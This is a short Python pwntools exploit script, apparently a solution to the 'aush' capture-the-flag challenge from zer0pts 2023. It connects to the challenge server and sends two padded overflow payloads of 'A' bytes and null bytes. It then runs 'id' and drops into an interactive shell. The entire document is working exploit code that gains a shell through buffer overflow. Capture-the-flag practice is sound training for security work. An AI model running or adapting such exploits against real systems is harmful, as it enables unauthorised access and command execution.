from pwn import *

#io = process('./aush')
io = remote('pwn.2023.zer0pts.com', 9006)
#elf = context.binary = ELF('./aush')

payload = 408*b'A' + 3*b'A'

io.sendafter(b'name: ', payload)

payload = 344*b'A'+8*b'\x00'
io.send(payload)
io.sendline(b'id')
io.interactive()
